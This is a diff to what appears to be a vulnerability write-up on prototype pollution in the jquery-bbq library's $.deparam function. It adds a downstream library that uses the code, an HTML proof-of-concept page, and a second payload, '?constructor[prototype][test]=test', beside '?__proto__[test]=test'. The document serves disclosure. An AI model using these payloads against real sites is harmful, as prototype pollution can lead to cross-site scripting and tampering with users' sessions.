@@ -2,6 +2,9 @@
 
 URL: https://github.com/cowboy/jquery-bbq
 
+Used in:
+ * jquery.xLazyLoader.js 1.3
+
 ### Vulnerable code fragment
 
 https://github.com/cowboy/jquery-bbq/blob/8e0064ba68a34bcd805e15499cb45de3f4cc398d/jquery.ba-bbq.js#L466-L556
@@ -101,6 +104,14 @@ https://github.com/cowboy/jquery-bbq/blob/8e0064ba68a34bcd805e15499cb45de3f4cc39
 ```
 
 ### PoC
+```html
+<script src="https://code.jquery.com/jquery-2.2.4.js"></script>
+<script src="https://raw.githack.com/cowboy/jquery-bbq/8e0064ba68a34bcd805e15499cb45de3f4cc398d/jquery.ba-bbq.js"></script>
+<script>
+  $.deparam(location.search.slice(1))
+</script>
+```
 ```
 ?__proto__[test]=test
+?constructor[prototype][test]=test
 ```
